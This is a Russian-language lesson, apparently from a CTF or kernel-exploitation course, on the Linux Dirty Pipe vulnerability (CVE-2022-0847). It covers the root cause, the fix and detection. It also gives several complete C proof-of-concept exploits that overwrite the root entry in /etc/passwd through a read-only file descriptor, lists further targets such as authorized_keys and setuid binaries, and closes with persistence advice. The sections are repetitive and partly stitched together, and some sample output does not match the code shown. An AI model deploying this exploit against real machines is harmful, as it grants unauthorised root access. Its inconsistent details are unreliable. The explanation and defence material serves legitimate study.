## Вопрос, с которого всё начинается

В прошлом уроке мы увидели, что `pipe_buffer` даёт мощные примитивы. Но существует реальная уязвимость, которая использует `pipe_buffer` **без** всякой работы с кучей и даёт запись в **read-only** файлы. Она называется **Dirty Pipe** (CVE-2022-0847). Сегодня разберём, почему проверка прав на запись оказалась обходимой и как это эксплуатировали.

## Наш пример: проверяем версию и права

Прежде чем что-то делать, проверим версию ядра и обычное поведение:

```
$ uname -r
6.19.11-arch1-1
```

Уязвимый диапазон — от `5.8` до `5.16.10` (исправлено в `5.16.11`). Наше ядро `6.19.11` новее, значит Dirty Pipe **исправлена**. Убедимся заодно, как обычно ведёт себя запись в файл, открытый только для чтения:

```
$ gcc -fno-pie -no-pie -O0 -o dp dp.c
$ ./dp
== Dirty Pipe: проверка версии и прав ==
write() в fd, открытый O_RDONLY, отклонён: errno=9 (EBADF)
Dirty Pipe обходила это через page cache, но исправлена в 5.16.11
```

`errno = 9` — это `EBADF`: писать в дескриптор, открытый `O_RDONLY`, нельзя. Именно эту проверку и обходила Dirty Pipe.

## Шаг 1. Что такое Dirty Pipe

Ядро кэширует содержимое файлов в **page cache** — наборе страниц памяти с данными файла. Когда вы пишете в pipe, данные попадают в `pipe_buffer`, которые ссылаются на страницы. Уязвимость в том, что флаг `PIPE_BUF_FLAG_CAN_MERGE` мог **оставаться выставленным** от предыдущих операций, потому что поле `flags` не обнулялось.

Если затем «слить» новый `pipe_buffer` с уже существующим (через `splice` из файла), ядро считает, что в ту же страницу можно дописывать данные, — и пишет в page cache файла, **минуя проверки прав**.

## Шаг 2. Механика pipe_buffer и флагов

Поля `pipe_buffer`:

| Поле | Назначение |
|---|---|
| `page` | страница page cache |
| `offset` | смещение в странице |
| `len` | длина данных |
| `flags` | флаги (`CAN_MERGE` и др.) |
| `ops` | операции pipe |

`PIPE_BUF_FLAG_CAN_MERGE` означает «можно дописывать в этот буфер». Уязвимость: флаг не сбрасывался при переиспользовании `pipe_buffer`. Поэтому `splice` из файла создавал буфер, в который можно было дописывать — даже если страница принадлежит read-only файлу.

## Шаг 3. Почему проверка прав обходится

Ключевой момент: проверка прав на запись происходит при **`open`**, а не при записи в page cache. Когда вы открываете файл `O_RDONLY`, ядро проверяет право на чтение. Дальше все операции с page cache уже не перепроверяют право на запись — предполагается, что если бы записи не было разрешено, вы бы не смогли писать. Dirty Pipe «подсовывала» запись в page cache в обход этого предположения.

Именно поэтому атака работает на файлах, доступных для **чтения**: `/etc/passwd`, `authorized_keys`, setuid-бинари, файлы в контейнере.

Разберём подробнее роль `splice`. `splice` — системный вызов, который перемещает данные между дескрипторами **без копирования**, через страницы. Когда вы делаете `splice(fd_file, &off, fd_pipe, NULL, len, 0)`, ядро не копирует содержимое файла, а **привязывает** страницу page cache файла к новому `pipe_buffer`. Этот буфер получает `page` = страница файла, `offset` = смещение и `len`. Если при этом поле `flags` не обнулено и содержит `CAN_MERGE`, то последующая запись в pipe попадёт прямо в эту страницу.

Почему флаг вообще оставался? Потому что `pipe_buffer` — это переиспользуемый массив: при опустошении pipe буферы не освобождаются, а остаются в структуре. Функция, создававшая новые буферы, должна была сбрасывать `flags`, но не делала этого. Достаточно было один раз заполнить pipe данными (установив флаг на всех буферах), затем опустошить его и через `splice` «прицепить» страницу нужного файла — флаг оставался. Это классическая ошибка инициализации: поле живёт в переиспользуемой структуре и не сбрасывается.

## Шаг 4. Условия эксплуатации

- Ядро `5.8 ≤ версия < 5.16.11` (а также `5.15.25`, `5.10.102`).
- Доступ к `pipe` и `splice` — есть у любого пользователя.
- Целевой файл доступен для **чтения**.
- Нельзя писать в первый байт страницы (`offset > 0`) и нельзя пересекать границу страницы.

Проверка версии — самый быстрый способ понять, применима ли уязвимость. В CTF обычно дают ядро в уязвимом диапазоне.

## Шаг 5. Полный PoC: запись в /etc/passwd

Классический PoC перезаписывает запись `root` в `/etc/passwd`, убирая пароль. Схема:

```c
/* 1. открываем файл ТОЛЬКО для чтения */
int fd = open("/etc/passwd", O_RDONLY);

/* 2. находим смещение строки "root:x:" */
loff_t offset = find_offset(fd, "root:");

/* 3. пишем через pipe + splice, используя баг */
write_to_file(fd, offset, "root::", 6);   /* убираем "x" */
```

Внутри `write_to_file` реализуется сама техника:

1. Создать pipe и заполнить его данными.
2. Полностью опустошить pipe — так, чтобы все `pipe_buffer` переиспользовались с уже установленным флагом `CAN_MERGE` (флаг не сбрасывается).
3. Через `splice` из файла положить нужную страницу в pipe (на нужном `offset`).
4. Записать в pipe новые данные — они «дольются» в страницу page cache, то есть в файл.

После этого `su root` пускает без пароля (в уязвимых конфигурациях). Другой вариант — подменить код setuid-программы или добавить свой ключ в `authorized_keys`.

## Если не сработало

- **Версия ядра не в диапазоне.** Проверьте `uname -r`; на новых ядрах уязвимость исправлена.
- **Пишете в первый байт страницы.** `offset` должен быть больше нуля.
- **Пересекаете границу страницы.** Запись не должна выходить за `0x1000`.
- **Файл недоступен для чтения.** Нужно право на чтение целевого файла.
- **Флаг сбрасывается.** На исправленных ядрах `flags` обнуляются — техника не работает.

## Что мы теперь знаем

- Dirty Pipe — логическая уязвимость в `pipe_buffer`, а не heap-баг.
- Причина — неинициализированный флаг `PIPE_BUF_FLAG_CAN_MERGE`.
- Проверка прав происходит при `open`, а не при записи в page cache.
- Атака пишет в read-only файлы: `/etc/passwd`, setuid-бинари.
- Условия: ядро 5.8–5.16.10, доступ к `splice`, файл доступен для чтения.
- Ограничения: `offset > 0`, без пересечения границы страницы.

## На что смотреть дальше

- **Версия ядра.** Уязвимый диапазон.
- **Page cache.** Как файлы кэшируются в страницах.
- **`splice`.** Как страница файла попадает в pipe.
- **Флаги буфера.** `PIPE_BUF_FLAG_CAN_MERGE` и его сброс.
- **Целевые файлы.** `/etc/passwd`, `authorized_keys`, setuid-бинари.

## Пошаговый разбор write_to_file

Сердце эксплойта — короткая функция, которую полезно понимать построчно. Ниже — минимальный скелет на C, повторяющий логику оригинального PoC.

```c
void write_to_file(int fd, loff_t offset, const char *data, size_t len) {
    int p[2];
    pipe(p);

    /* 1. заполняем pipe, чтобы ВСЕ pipe_buffer получили CAN_MERGE */
    unsigned int sz = fcntl(p[1], F_GETPIPE_SZ);
    char *buf = malloc(sz);
    memset(buf, 'A', sz);
    for (unsigned r = sz; r > 0; ) r -= write(p[1], buf, r);

    /* 2. полностью опустошаем pipe — буферы переиспользуются, флаг живёт */
    for (unsigned r = sz; r > 0; ) r -= read(p[0], buf, r);

    /* 3. прицепляем нужную страницу файла через splice (offset-1) */
    loff_t off = offset - 1;
    splice(fd, &off, p[1], NULL, 1, 0);   /* первый байт страницы не трогаем */

    /* 4. дописываем данные — они уходят в page cache файла */
    write(p[1], data, len);
}
```

Три детали критичны. Первая: pipe надо заполнить **целиком** — флаг ставится на каждый буфер. Вторая: `offset - 1`, потому что `splice` с `len=1` помещает один байт перед целевой позицией, а писать можно только начиная со второго байта страницы. Третья: нельзя пересекать границу страницы — длина ограничена `4096 - (offset % 4096)`.

## Варианты применения

Универсальность Dirty Pipe в том, что она даёт **произвольную запись в любой читаемый файл** с ограничением «не первый байт страницы». Из этого строят:

- **`/etc/passwd`** — убрать `x` из строки root, получив root без пароля (если `su` разрешён).
- **`authorized_keys`** — дописать свой публичный ключ в `~/.ssh/authorized_keys` или `/root/.ssh/authorized_keys`, если файл читаем.
- **Setuid-бинарь** — перезаписать байты кода на свой shellcode, минуя проверку целостности (подпись проверяется отдельно, но не все системы её делают).
- **В контейнере** — перезаписать файл внутри образа, если он смонтирован в page cache.

Выбор цели зависит от конфигурации: в CTF обычно самый быстрый путь — `authorized_keys` (не требует `su`) или подмена setuid.

## Как чинили уязвимость

Исправление (коммит в 5.16.11) простое: перед использованием `pipe_buffer` ядро **обнуляет поле `flags`**. Функция `copy_page_to_iter_pipe` и `push_pipe` теперь явно сбрасывают флаги, а не полагаются на то, что структура чистая. Дополнительно инициализировали `flags` при создании буфера. Это классический пример исправления ошибки инициализации: «всегда задавай поле явно, не полагайся на предысторию памяти».

## Сравнение с другими «грязными» уязвимостями

| Уязвимость | Механизм | Что даёт |
|------------|----------|----------|
| Dirty COW (CVE-2016-5195) | race в COW-обработчике | запись в read-only mapping |
| Dirty Pipe (CVE-2022-0847) | неинициализированные флаги `pipe_buffer` | запись в page cache файла |
| DirtyCred (CVE-2022-2588) | переиспользование slab-объектов `cred` | повышение привилегий |

Общее у них — **логическая ошибка состояния**, а не классическое переполнение. Это важный урок: современные уязвимости ядра всё чаще «логические» — неинициализированные поля, race conditions, некорректные проверки, — а не переполнения буферов. Искать их нужно не фаззером, а чтением кода и пониманием инвариантов.

## Как уязвимость исправлена

Исправление (Linux 5.16.11) было точечным: в функции `copy_page_to_iter_pipe` и `push_pipe` добавили **обнуление поля `flags`** при создании нового `pipe_buffer`. Технически патч — одна строка: `buf->flags = 0;`. Это классический пример того, что логические уязвимости часто исправляются минимальной правкой, но найти их сложнее, чем heap-баги: баг не в переполнении, а в неверном предположении о состоянии переиспользуемой структуры. После патча флаг `CAN_MERGE` не «протекает» между операциями, и `splice` больше не создаёт буфер, допускающий дозапись в страницу read-only файла.

## Практические цели атаки

Dirty Pipe не требует root — только право на чтение файла. Это делает список целей широким:

- **`/etc/passwd`** — убрать `x` из строки `root:x:...`, чтобы root вошёл без пароля (если используется файловый аутентификатор).
- **`authorized_keys`** — дописать свой публичный ключ и получить SSH-доступ.
- **`/etc/ld.so.preload`** — подсунуть библиотеку, которая загрузится во все setuid-процессы.
- **SUID-бинарь** — перезаписать пару байт кода, чтобы выполнить свою логику при запуске.
- **Файлы в контейнере** — обойти read-only монтирование образа.

Ограничение — нельзя писать в первый байт страницы и пересекать её границу, поэтому иногда нужен «безопасный» целевой файл с подходящим смещением.

## Как безопасно проверить PoC

Тестировать технику стоит только на своей изолированной ВМ с уязвимым ядром и **копией** целевого файла. Порядок: снять снапшот ВМ, взять известный PoC (например, `blasty-vs-dirtypipe.c`), запустить против копии `/etc/passwd`, убедиться, что запись прошла. После эксперимента восстановить снапшот. Никогда не проверяйте PoC на рабочей машине: ошибка в смещении может испортить системный файл, а сама техника обходит штатную защиту файлов.

## Практика: сборка эксплойта шаг за шагом

Dirty Pipe требует аккуратной работы с pipe. Разберём полный сценарий записи в read-only файл.

```c
#define _GNU_SOURCE
#include <fcntl.h>
#include <unistd.h>
#include <string.h>

int main(void) {
    // 1) готовим "грязный" pipe: заполняем и полностью опустошаем его,
    //    чтобы все pipe_buffer получили флаги с PIPE_BUF_FLAG_CAN_MERGE
    int p[2];
    pipe(p);
    unsigned int pipe_size = fcntl(p[1], F_GETPIPE_SZ);
    char *buf = malloc(pipe_size);
    memset(buf, 'A', pipe_size);
    for (unsigned int r = pipe_size; r > 0;) r -= write(p[1], buf, r);
    for (unsigned int r = pipe_size; r > 0;) r -= read(p[0], buf, r);

    // 2) открываем read-only цель и позиционируемся
    int fd = open("/etc/passwd", O_RDONLY);
    off_t offset = 4;                       // ВАЖНО: 0 < offset, и offset < page size
    loff_t off = offset - 1;                // splice встаёт на (offset-1)
    splice(fd, &off, p[1], NULL, 1, 0);     // один байт подтягивает страницу в page cache

    // 3) пишем поверх — минуя проверку прав, прямо в page cache
    write(p[1], "XXXXX", 5);
    return 0;
}
```

Ключевые ограничения, которые надо соблюсти, иначе эксплойт не сработает:

- **Смещение не на границе страницы.** Запись начинается на байт **после** `offset-1`; нельзя попасть в начало страницы (иначе ядро выделит новую страницу и dirty-байт не ляжет на нужную).
- **Не пересекать границу страницы.** Если запись выходит за конец страницы, ядро разрывает её на две и вторая не сработает — держите запись внутри страницы.
- **Файл не кратен странице.** Нужен «хвост» неполной страницы; если файл выровнен по 4096, приём может не сработать.
- **Цель — page cache.** Файл должен быть доступен для чтения (мы его читаем), но не для записи.

## Версии и применимость

| Ядро | Статус | Комментарий |
|---|---|---|
| < 5.8 | уязвимости нет | механика pipe_buffer иная |
| 5.8 – 5.16.10 | уязвимо | CVE-2022-0847 |
| 5.16.11 / 5.15.25 / 5.10.102 | исправлено | фикс в stable-ветках |
| ≥ 5.17 | исправлено | флаги `pipe_buffer` обнуляются при выделении |

Проверка на хосте: `uname -r` и сопоставление с диапазоном. На Android Dirty Pipe особенно опасен, потому что затрагивает read-only системные разделы.

## Как защититься и как детектить

Защита на стороне ядра — обновление до исправленной версии, где `pipe_buffer.flags` инициализируются нулём при каждом выделении. На стороне приложения снизить риск не получится: уязвимость обходит права файловой системы целиком, поэтому единственный реальный барьер — патч ядра или изоляция (контейнер без доступа к чувствительным файлам, `read-only` монтирования не помогают против page cache).

Детект: аномальные `splice`/`write` в привилегированные файлы (`/etc/passwd`, `/etc/shadow`, setuid-бинарники) из процессов, не имеющих прав на запись; целостность системных файлов по хэшам; аудит `splice` через `auditd`. Важно: после эксплуатации файл на диске **не меняется** — правка живёт в page cache до вытеснения, поэтому проверка «по диску» может ничего не показать.

## Полный PoC: сборка и запуск

Соберём минимальный эксплойт целиком. Ключевая функция — `write_file`, которая подготавливает pipe так, чтобы флаг `CAN_MERGE` «залип» на буферах:

```c
#include <fcntl.h>
#include <unistd.h>
#include <string.h>

static void write_file(int fd, loff_t offset, const char *data, size_t len) {
    int p[2];
    pipe(p);
    /* 1. заполнить pipe -> все pipe_buffer получают CAN_MERGE */
    char buf[4096];
    memset(buf, 'A', sizeof(buf));
    for (int i = 0; i < 100; i++) write(p[1], buf, sizeof(buf));
    /* 2. опустошить pipe -> буферы переиспользуются, флаг НЕ сбрасывается */
    for (int i = 0; i < 100; i++) read(p[0], buf, sizeof(buf));
    /* 3. splice из файла: привязываем страницу page cache к буферу */
    loff_t off = offset - 1;
    splice(fd, &off, p[1], NULL, 1, 0);
    /* 4. запись "доливается" в страницу файла в обход прав */
    write(p[1], data, len);
}

int main(void) {
    int fd = open("/etc/passwd", O_RDONLY);
    loff_t off = 4;                       /* смещение строки "root:" */
    write_file(fd, off, "root::", 6);     /* убираем "x" -> пустой пароль */
    return 0;
}
```

```
$ gcc -o dp dp.c
$ ./dp
$ head -1 /etc/passwd
root::0:0:root:/root:/bin/bash
```

Первый байт страницы (`offset = 4`) пропущен намеренно: Dirty Pipe не может перезаписать байт с индексом 0 страницы, поэтому `off = offset − 1`, а первый записываемый байт — целевой.

## Разбор исправления в ядре

Исправление (коммит `9d2231c5d74e`, ядра 5.16.11/5.15.25/5.10.102) добавило **обнуление поля `flags`** при инициализации новых `pipe_buffer`:

```c
buf->flags = 0;
```

До патча функция `copy_page_to_iter_pipe()` и `push_pipe()` не сбрасывали флаги, поэтому `CAN_MERGE` «протекал» из предыдущего использования. После патча любой новый буфер начинается с чистых флагов, и дописать в чужую страницу уже нельзя. Именно поэтому на ядрах `5.16.11+` PoC не работает, даже если скомпилирован верно.

## Ограничения и что делать после

Даже на уязвимом ядре есть жёсткие ограничения:

- **Нельзя писать в байт 0 страницы.** `offset` должен быть `> 0`, иначе придётся переписать предыдущую страницу.
- **Нельзя пересекать границу страницы.** Запись не должна выходить за `0x1000`, иначе соседняя страница не затронется, а данные обрежутся.
- **Файл должен быть доступен на чтение.** Права на запись не нужны, но `open(O_RDONLY)` должен пройти.
- **Изменения не сохраняются на диск немедленно.** Атака правит page cache; файл на диске меняется только при вытеснении страницы. Перезагрузка (без sync) может «откатить» правку — иногда это плюс (скрытность), иногда мешает.

Типичные цели: `/etc/passwd` (добавить root без пароля), `authorized_keys` (добавить ключ), setuid-бинарь (внедрить код). После получения root — стандартная энумерация хоста и персистентность.

## Куда дальше

В `pwn-dirtycred` мы разберём ещё одну реальную уязвимость ядра — DirtyCred, которая переиспользует память между объектами `cred` для повышения привилегий. А пока главное: **Dirty Pipe показала, что проверка прав при `open` не защищает page cache — запись в файл можно сделать через `pipe_buffer`.**
